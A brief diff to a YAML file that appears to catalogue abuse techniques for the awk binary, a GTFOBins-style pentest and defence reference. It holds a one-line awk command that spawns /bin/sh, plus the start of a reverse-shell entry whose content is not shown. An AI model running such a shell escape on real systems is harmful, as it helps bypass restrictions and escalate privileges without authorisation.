@@ -1,3 +1,4 @@
+functions:
   shell:
     - code: awk 'BEGIN {system("/bin/sh")}'
   non-interactive-reverse-shell:
